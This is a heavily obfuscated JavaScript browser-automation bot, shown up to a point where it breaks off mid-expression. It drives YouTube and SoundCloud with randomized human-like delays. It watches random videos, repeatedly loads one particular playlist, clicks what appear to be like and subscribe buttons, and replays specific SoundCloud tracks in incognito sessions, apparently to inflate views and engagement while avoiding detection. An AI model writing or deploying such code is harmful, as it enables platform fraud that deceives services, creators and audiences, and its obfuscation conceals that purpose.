const a2 = d,
  a0 = c,
  Z = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x4f * -0x60 + -0x2301 + -0x6a * -0xd))) + i;
}
async function createPage(f, h) {
  const R = d;
  let i = await f['newPage']();
  return await i['setDefault' + R(0x9) + 'Timeout'](-0x1b5 * 0x8 + 0xa57 * 0x3 + -0x115d), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x9bdf + -0xce6b + 0x1df7a + (-0x1f68 + 0x4ef3 * 0x1 + 0x17 * 0x7b) * random()) : await standardWaitForNetIdle(f), await wait(0x5a4 * 0x6 + -0x25 * 0x15 + 0x1 * -0xb47 + (-0x22f3 + 0x23e * 0x20 + 0x243 * 0x1) * random()), 0x39c + 0x17 * 0x106 + -0x1 * 0x1b25;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1062 + 0x16 * -0xe9 + 0x28 * 0x166), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x34 * -0xbb + 0xdf3 + -0x33ee;
}
async function randomWait() {
  return await wait(0x2321 + -0x3 * 0x8a5 + 0xa56 + (-0xcef * -0x2 + 0x1 * 0x189 + -0x7df) * random()), 0x4 * 0x39e + -0x659 + -0x81e;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x17d4 + -0x2310 + 0x1 * 0xb3c, 0x23b * 0x7 + 0x4 * 0x120 + 0x359 * -0x6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x4f39 + -0x2c * -0x769 + 0xc73 * -0x1) * getRandomInt(0x3 * 0xbdd + 0x4b0 + -0x2845, -0x19 * -0x65 + -0x4 * 0xb + 0x2 * -0x4d6), h)), 0x1c14 + -0x1237 + -0x9dc;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x517 * 0x5 + 0xe43 + 0xb30);
    let h = e[f];
    if (b['LHaTkD'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2 * 0x4a5 + -0x363 * 0x6 + -0xa * -0x2f6, s, t, u = 0x1e * 0x6 + -0x5ae * 0x1 + -0x1a * -0x31; t = n['charAt'](u++); ~t && (s = r % (-0xc2b + 0x13ca + 0x79b * -0x1) ? s * (-0x137 * 0x19 + 0x678 + 0x1827) + t : t, r++ % (-0x1ebd + -0x1061 + -0x6 * -0x7db)) ? p += String['fromCharCode'](0x6 * 0x2b4 + -0x1 * -0x2433 + 0x1124 * -0x3 & s >> (-(0x7 * 0xf1 + -0x1842 + -0x389 * -0x5) * r & 0x12fb * 0x1 + 0xc7 * 0x23 + -0x2e2a)) : -0x1 * -0x78d + 0xcc3 + -0x1450) {
          t = o['indexOf'](t);
        }
        for (let v = 0xc2f * -0x1 + 0x1d8a * 0x1 + 0x3 * -0x5c9, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x112e + -0x43 * 0x1 + 0x1181))['slice'](-(0x1c37 + 0x1 * -0xcb8 + -0xf7d * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xe4b + -0x2 * -0x162 + 0xb * -0x18d,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x244a * 0x1 + -0x1eb6 + 0x4300; u < 0x1 * 0x707 + 0x33 * 0x9 + 0x7 * -0x11e; u++) {
          p[u] = u;
        }
        for (u = 0x2527 + -0x168d * -0x1 + -0x4 * 0xeed; u < 0x2 * 0x1214 + 0x2a * 0xb1 + -0x4032; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xb19 + -0x19 * -0x65 + -0x16 * -0x1a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x21 * -0x27 + 0x772 + -0xc79, q = -0x15b6 + -0x1 * -0x11a5 + 0x411;
        for (let v = 0x1f4 * 0x6 + -0xf2a + -0x15 * -0x2a; v < n['length']; v++) {
          u = (u + (0xbee + -0x7ce + -0x41f)) % (-0x1a49 + -0x5 * 0x3d + 0x5 * 0x5b2), q = (q + p[u]) % (0x3b9 * -0x7 + 0x21b8 + -0x6a9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x2 * 0xc5f + -0x1fbe + -0x1a * -0x236)]);
        }
        return t;
      };
      b['gaaFTy'] = m, c = arguments, b['LHaTkD'] = !![];
    }
    const j = e[-0x1 * -0x167 + -0x1 * -0x1fc9 + -0x84c * 0x4],
      k = f + j,
      l = c[k];
    return !l ? (b['EGOMBm'] === undefined && (b['EGOMBm'] = !![]), h = b['gaaFTy'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * -0x11a5 + -0xc30 + -0xb * 0x7f;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0xe4b + -0x1 * -0x2033 + -0x1 * 0x2e7d]['split']('\x20');
    for (let k = -0x73d + -0x2246 + 0x2983; k < i['length']; k += -0xef6 + 0x2 * 0x986 + -0x414)
      j += i[k] * h[i[k + (-0x8 * -0x437 + 0x2407 + -0x45be)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const S = d,
      j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1fbe + 0x1ea5 + -0x7 * -0x29)['map'](l => Array['from'](l['children']))['flat'](-0x1 * -0x167 + -0x1 * -0x1fc9 + -0x212f * 0x1)['map'](l => l['childNodes'][0x1 * -0x1a99 + -0x9 * 0x1f6 + 0x2c40]['childNodes'][0x140e + -0x201a + 0xc0c]['childNodes'][0x935 + -0x28 * -0x6b + -0x1da * 0xe]['childNodes'][-0x1 * -0x1b01 + 0x65 * -0x56 + 0x6ed][S(0x0)][0xd40 + 0x22e8 + -0x15 * 0x24b]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1e52 + -0x1 * -0x5b1 + 0x1c89, 0x3a + 0x18f * -0x11 + 0x929 * 0x5)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x11c * -0x1d + -0x1 * 0x5e00 + 0x786c);
  const h = await getMaxTime(f),
    i = Math['min']((-0x128bc + 0x22 * -0x23e + 0x25f58) * getRandomInt(0x9c9 + 0x1 * -0xe9 + -0x8de, 0x1de * -0x11 + -0x1 * 0x18cd + 0x16a * 0x28), h);
  return await wait(i), -0x1548 + -0x16 * -0x7b + 0xab7;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const T = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1ad1 + 0x119 * 0x1 + -0x4a7 * 0x6]['children'][0xf6 * -0x11 + 0x335 * 0x1 + 0xd21 * 0x1]['children'][-0x1cc + 0x1543 + 0x97 * -0x21]['children'][-0x2 * -0xe35 + -0x1 * 0xe5a + -0x258 * 0x6]['children'][-0x79 * -0x4c + 0x1c3e + -0x402a][T(0x1a) + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x332 + 0x269 * -0x3 + 0x40a;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x18f1 * 0x1 + 0x1985 + 0xd * -0x3da + (-0x1 * -0x23e3 + -0xff + -0x22b2) * random()
  }), await wait(0x1050 + -0x1 * 0xe27 + -0x35 + (-0x1 * 0x417 + 0xb82 + -0x27 * 0x29) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const U = d,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1bcb + -0x12 * 0x1f3 + 0x3ee3]['childNodes'][-0x21f2 + 0x50 * 0x10 + 0x1cf3 * 0x1]['childNodes'][-0x1f34 + -0x240b + -0x10d * -0x40]))[Math['floor'](Math[U(0xf)]() * m['length'])];
    var m;
    const n = l['childNodes'][0x1289 + 0xa31 * 0x2 + 0x2 * -0x1373]['childNodes'][-0x20 + -0x10eb + 0x110b]['childNodes'][-0x22c3 + 0xe9c + -0x1 * -0x1429]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x656 + 0x2 * 0xad1 + 0x1bf7 * -0x1),
          r = -0x167c + 0xdda + 0x8a2;
        for (let u = 0x148e + -0x2 * 0x5f7 + -0x30 * 0x2e; u < q['length']; u += -0xe67 * 0x2 + -0x4 * -0x6df + -0x1 * -0x154)
          r += q[u] * k[q[u + (-0xdd2 * -0x1 + 0x725 + -0x2 * 0xa7b)]];
        return r;
      }(n);
  });
  await wait((-0x6ff3 + -0x1455 + -0x4 * -0x2fb8) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x2e6f + -0x14b30 + 0x263ff) * getRandomInt(0x1e05 + 0x1a9e + -0x38a2 * 0x1, -0x1bc8 + 0x1005 + 0xbcd), h + (-0xe29 + 0x12c8 + 0xee9));
  return await wait(i), 0x2 * 0x1093 + -0xb * -0x13 + 0x1e3 * -0x12;
}
async function keyWatch(f) {
  const V = c;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x49 + 0x6d * 0x55 + -0x247a), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + V(0x17) + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x6dc + -0x2 * 0xc6d + -0x1db6 * -0x1 + (-0x1 * 0x1a1 + 0x2325 + -0x1d9c) * Math['random']());
    });
  }, 0x3320 + 0x789 + -0x1f51);
  await wait(0x7d * 0x125 + -0x36bb7 + 0x1 * 0x77086);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xd765 + 0x1 * 0x19631 + -0x18336) * getRandomInt(-0x23a3 + 0x2557 + -0x1b0, 0x1588 + 0xf50 + 0x17 * -0x199)), clearInterval(h), -0x15 * 0xae + 0x158e + 0x45 * -0x1b;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1691 * 0x1 + -0x2198 + 0x3829;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x6f9 * -0x1 + 0x1edb + -0x17e1 * 0x1;
    await randomWait();
  }
  return 0x1a2e + -0x25 * -0xbe + -0x255 * 0x17;
}

function fetchRandomSC() {
  const W = b;
  return Math['random']() <= 0xf1c * 0x2 + -0x1 * -0x2332 + 0x6 * -0xae7 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x32 * 0x2b + 0x1489 * 0x1 + 0x1cef * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + W(0x1c, '&voR') + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const br = [
    'childNodes',
    'rCkkW5lcQSkXWRhcNMvdhW',
    'yCklamoGnSojWPldHxJdTG',
    'Bc9vq1vHvf8Zoq',
    'W7bEfSoSjCov',
    'W6zPzfFdGYHUW6KE',
    'urviv.io_X',
    'WPtcOgHqyG',
    't\x20react,wh',
    'Navigation',
    'zgLNzxn0',
    'DMvYC2LVBNm',
    'https://me',
    'ChrZl2j5lxnPDa',
    'catch',
    'random',
    'ig1YyMvHC3qGyW',
    'zwfZEwzVCMSUBW',
    '3_1)\x20Apple',
    'W4ddJCkwrSoIFKq',
    'W7/dLSkmWO52W7HfyCo8WPK',
    'chores-tha',
    'p03cR3GAWPWg',
    'Dc1IDxr0B24TCW',
    'W7hdGmkxxCo9CGJcPCkOWQG',
    'rtaWoevXBdu5tq',
    'setAttribu',
    '8.0.5359.1',
    'BCoeDmkJECo5ECokWQ8V',
    'z094Auu1vufbra'
  ];
  a = function() {
    return br;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x517 * 0x5 + 0xe43 + 0xb30);
    let h = e[f];
    if (c['QVhfgc'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2 * 0x4a5 + -0x363 * 0x6 + -0xa * -0x2f6, r, s, t = 0x1e * 0x6 + -0x5ae * 0x1 + -0x1a * -0x31; s = m['charAt'](t++); ~s && (r = q % (-0xc2b + 0x13ca + 0x79b * -0x1) ? r * (-0x137 * 0x19 + 0x678 + 0x1827) + s : s, q++ % (-0x1ebd + -0x1061 + -0x6 * -0x7db)) ? o += String['fromCharCode'](0x6 * 0x2b4 + -0x1 * -0x2433 + 0x1124 * -0x3 & r >> (-(0x7 * 0xf1 + -0x1842 + -0x389 * -0x5) * q & 0x12fb * 0x1 + 0xc7 * 0x23 + -0x2e2a)) : -0x1 * -0x78d + 0xcc3 + -0x1450) {
          s = n['indexOf'](s);
        }
        for (let u = 0xc2f * -0x1 + 0x1d8a * 0x1 + 0x3 * -0x5c9, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x112e + -0x43 * 0x1 + 0x1181))['slice'](-(0x1c37 + 0x1 * -0xcb8 + -0xf7d * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['yYvFUZ'] = i, b = arguments, c['QVhfgc'] = !![];
    }
    const j = e[0xe4b + -0x2 * -0x162 + 0xb * -0x18d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['yYvFUZ'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1729 + 0x355 * -0xb + -0xb * -0x13a + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x2338 + 0x34 * -0xa7 + 0x1 * -0x14c;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x28e4 + 0x1ffa + 0x1127 * 0x6 + getRandomInt(-0x1f * -0x202 + 0x32a4 + -0x364a * 0x1, -0xc5ba + -0xc9 + 0x13bb3));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x775 * -0x3 + -0x186c + 0x20e), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * 0x11fb + -0x23 * 0x4d + -0x27c * 0x3;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2589 + 0x7aa + 0x3 * 0x9f5, 0x2 * -0xef7 + 0x1 * 0x1d53 + 0xcd)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x55a + -0x1a * -0x9d + 0xb2 * -0x4 + floor((0x582 + -0xa43 * 0x3 + -0x1 * -0x1d2f) * random()))), log('p2'), log(await s['evaluate'](() => {
        const X = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process[X(0xb)] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x2 * -0x40e1b6a7 + 0xf595ae50 + -0xf7591b9e),
          -0x6ce69d + -0x2b89 * 0x24f + 0x15167e4,
          0x15de * -0x6 + -0x72a3 * 0x2 + 0x1e87a,
          0x20a1 * -0x1 + -0x51 * 0x65 + 0x4116
        ], y = [
          0x2 * -0x92e + -0x3ab + -0x7 * -0x329,
          0x1 * 0x40f + -0x20b0 + 0x1cb1 * 0x1,
          0xf72 + 0xb53 + -0x5 * 0x559,
          0x1 * 0x7ee + -0x3 * -0xa4c + -0x26d2
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x11 * 0x116 + -0x21b2 + -0x2f * -0x53)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x200f + -0x1311 * 0x1 + -0x67f * 0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const Y = c;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x9 * -0x2ee + 0x1dcc + -0x1 * 0x36e) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))[Y(0xa)]('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x797 + 0x41 * 0x41 + -0x1818] = A[0xb2c + -0xf7 * -0x20 + -0x29fc] = A[0x25e7 * 0x1 + -0x9fc + -0x1bea] = A[0x1 * 0x1c3c + -0x26 * 0x6 + -0x1b56] = A[-0x143b + 0xa98 + 0x9a6] = A[0x1 * 0xce4 + 0x1dba + -0x7 * 0x616] = A[-0x23e5 + 0xb76 + 0x1874] = A[-0xcf * -0x2d + 0x260b + -0x4a68] = A[0x2611 + 0xce3 * -0x2 + -0xc44] = A[-0xfdd + 0x20 * -0xf1 + 0x2e05] = A[0xb50 + 0x95 * 0x15 + -0x1780] = A[0x1465 + -0xf86 + -0x4d5] = A[0x1e6b + 0x1 * -0x263f + 0x7df] = A[0xe62 + -0x38f + -0xac7] = A[-0x12de + -0x10b + 0x3fe * 0x5] = A[0x20c * 0x13 + -0x4 * -0x115 + -0x1 * 0x2b2a] = A[-0x15f * -0x1a + 0x1cc3 + -0x405a] = -0x2 * 0x7b0 + -0x242 + 0x11a2, this['blocks'] = A) : this['blocks'] = [
                -0x1 * 0x193f + -0x9e9 + -0xc * -0x2ee,
                0x1a97 + 0x2 * 0xfe3 + 0xdf * -0x43,
                -0x50 * -0x6 + -0x1 * 0xf21 + -0x46b * -0x3,
                0x19c7 + 0x109a + -0x2a61,
                0x19 * -0x3 + -0x2 * -0x50c + -0x9cd,
                0x4d * -0x6b + -0xc3d * 0x2 + -0x5 * -0xb55,
                0x189a + -0xad2 + 0xa8 * -0x15,
                0x1c2f + -0x10 * 0x47 + -0x17bf * 0x1,
                -0x2672 + -0xec6 + 0x3538,
                0x8cb + 0x99f + -0x2 * 0x935,
                -0x19a2 + -0x1195 + 0xd * 0x353,
                0xd3c + -0x4dd + -0x85f * 0x1,
                0x3a * 0x5b + 0x1057 + -0x24f5,
                0xbf7 + -0x1b6a + -0xf73 * -0x1,
                -0x1dc0 + 0x2f * -0x80 + 0x3540,
                -0x159 * 0x7 + 0x98e * -0x1 + 0x12fd,
                0x2536 * -0x1 + -0x1891 + 0x3dc7
              ], this['h0'] = -0x1a1473f0 + 0x1 * -0x92383209 + 0x11391c8fa, this['h1'] = 0x1b107564e + -0x1 * -0x177e58115 + -0x1adc77e * 0x153, this['h2'] = 0xb8e42eaa + 0x1a * -0x771be6b + 0xa1640532, this['h3'] = -0x85cf066 + 0x34b739f + 0x1543d13d, this['h4'] = -0x4 * 0x5ffbb53b + -0x1570d7fd5 + 0xb88fd7bd * 0x5, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2e * 0x2 + -0x50e * -0x4 + 0x1494 * -0x1, this['finalized'] = this['hashed'] = -0x14b8 + 0x494 * -0x2 + 0x1de0, this['first'] = -0x3 * -0x64b + -0x12b7 * 0x2 + 0x1db * 0xa;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x31 * 0x5 + -0x1d1 + 0x2c6, O = J['length'] || -0x328 + 0x767 * -0x5 + 0x317 * 0xd, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2 * -0x1cf + 0x12e * -0x13 + -0x4 * -0x4b3, P[0xb02 + -0x41b * -0x3 + 0x1753 * -0x1] = this['block'], P[-0x3e6 + 0x25a7 + -0x21b1] = P[0x9ec + -0x2072 * 0x1 + 0x1687] = P[0x13 * 0x1e7 + 0x2 * 0xc6f + -0x2a7 * 0x17] = P[0x13 * 0x111 + 0xfa8 + -0xc * 0x2fe] = P[-0x1 * -0x1b17 + 0x3d * 0x19 + -0xe * 0x25c] = P[-0x1640 + 0x6 * -0x463 + 0x7 * 0x6f1] = P[0x10 * -0x235 + -0x1bad + -0x13 * -0x351] = P[0x1 * 0x332 + -0x1e1a + -0x3d9 * -0x7] = P[-0x29 * -0xbc + 0x2d6 + -0x20ea] = P[0x1247 + -0x1cdc + 0xa9e] = P[0x45 * 0x31 + 0x289 * -0xd + 0x13ca * 0x1] = P[0x150e + 0x16a7 * 0x1 + -0x19e * 0x1b] = P[0x1 * 0x1baf + 0x5 * -0x1eb + 0x2a * -0x6e] = P[-0x14f0 + -0x108e + 0x1 * 0x258b] = P[-0x1e6b + 0x2092 + -0x219] = P[0xf14 + -0x84 + 0x2f * -0x4f] = -0x268b + 0x2 * -0x525 + 0x30d5), K) {
                    for (N = this['start']; M < O && N < 0x1 * 0x133f + 0x1d5b + -0x305a * 0x1; ++M)
                      P[N >> -0x91 * -0x2e + -0x238c + -0x26 * -0x40] |= J[M] << y[-0x20d8 + -0x15e * 0xe + 0x33ff * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1e33 * -0x1 + 0x124a * -0x1 + 0x1 * -0xba9; ++M)
                      (L = J['charCodeAt'](M)) < -0x114f + -0x1 * -0x1a0b + -0x83c ? P[N >> -0x1857 + -0x4ff * -0x7 + -0xaa0] |= L << y[0x7c6 + -0xe06 * 0x1 + 0x643 & N++] : L < -0x1f * -0x3b + 0x1 * 0x76 + -0x1 * -0x65 ? (P[N >> 0x4b6 + 0x141a + -0x18ce] |= (0x103d * -0x1 + 0x4 * -0x743 + 0x2e09 | L >> 0x2351 * -0x1 + -0x10d * -0x25 + 0x6 * -0x97) << y[0xa0a + 0x8de + -0x12e5 & N++], P[N >> -0x1 * -0xbcb + 0x70 + -0xc39] |= (0x1 * -0x25ac + -0x15 * -0x7b + 0x4f * 0x5b | -0x284 + -0x282 * -0x2 + -0x1 * 0x241 & L) << y[-0x23bb + 0x115 * -0x14 + 0x71 * 0x82 & N++]) : L < 0x9 * 0x1d21 + -0x124f * 0x9 + 0x769e || L >= -0x3 * -0xbc1 + -0x4b1 + 0xe * 0xdd1 ? (P[N >> 0x17f0 + -0x2b6 * -0x1 + -0x1aa4] |= (0x1334 + -0x33 * -0x8b + 0xbb * -0x3f | L >> 0x1 * 0x1c0 + 0xdf1 + 0x59 * -0x2d) << y[0x8a8 * 0x4 + -0x8d * -0x1b + -0x1 * 0x317c & N++], P[N >> 0xcc5 + 0x413 + -0x10d6] |= (-0x5d * 0x67 + -0xf43 + 0x352e | L >> 0x159d + 0xd * 0x6a + -0x1af9 & 0x265 * -0x6 + 0x2442 + -0x15a5) << y[-0xaee + -0x105b + 0x1b4c & N++], P[N >> -0x201e + -0x1247 + 0x3267] |= (0x217f + 0x5e3 + -0x26e2 | 0xddb * 0x1 + -0x1 * 0x1d9b + 0x23 * 0x75 & L) << y[-0x1396 + -0x21fa + 0xd3 * 0x41 & N++]) : (L = -0x1a80 + -0x3 * -0xf4f + 0xec93 + ((-0x691 + 0x11a0 + -0x710 & L) << -0x4c * -0x55 + -0x19a + -0x1798 | -0x2 * 0xb98 + -0x3 * 0x16c + -0x1 * -0x1f73 & J['charCodeAt'](++M)), P[N >> -0x110a + 